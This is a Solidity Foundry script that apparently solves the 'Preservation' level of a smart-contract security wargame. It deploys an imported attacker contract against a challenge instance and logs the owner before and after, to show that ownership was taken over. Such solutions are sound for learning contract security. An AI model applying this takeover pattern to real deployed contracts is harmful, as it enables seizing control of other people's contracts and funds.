// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Disappearance} from "../src/16_Preservation.sol";

interface IPreservation {
    function owner() external view returns (address);
}

contract PoC is Script {
    address private immutable preservation =
        0x8588D155A211844d8dA27b09EAf89C657Cd3c496; // Replace with your Preservation instance

    function run() external payable {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        console2.log("Current owner: ", IPreservation(preservation).owner());

        Disappearance disappearance = new Disappearance(preservation);
        disappearance.attack();

        console2.log("New owner: ", IPreservation(preservation).owner());

        vm.stopBroadcast();
    }
}
